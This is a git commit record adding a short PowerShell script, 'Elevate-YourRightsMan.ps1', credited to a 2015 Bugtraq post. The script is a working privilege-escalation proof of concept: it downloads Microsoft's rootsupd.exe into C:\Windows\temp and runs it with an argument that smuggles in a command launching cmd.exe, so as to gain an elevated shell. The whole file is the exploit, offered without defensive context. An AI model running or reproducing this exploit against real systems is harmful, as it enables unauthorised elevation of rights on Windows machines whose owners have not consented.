a0c19e648b340dd1b8d946696e12575447b22bc3
Pierre-Alexandre Braeken <pabraeken@gmail.com>
2015-09-11 07:30:42 -0400

    EYLR added
    based on http://seclists.org/bugtraq/2015/Sep/24 post

---
+++ EYLR/Elevate-YourRightsMan.ps1
@@ -0,0 +1,9 @@
+﻿# http://seclists.org/bugtraq/2015/Sep/24
+
+$fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
+$fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
+     
+$client = new-object System.Net.WebClient 
+$client.DownloadFile($fileToDownload, $fileDownloaded) 
+      
+&$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title Follow The White Rabbit ;-)"
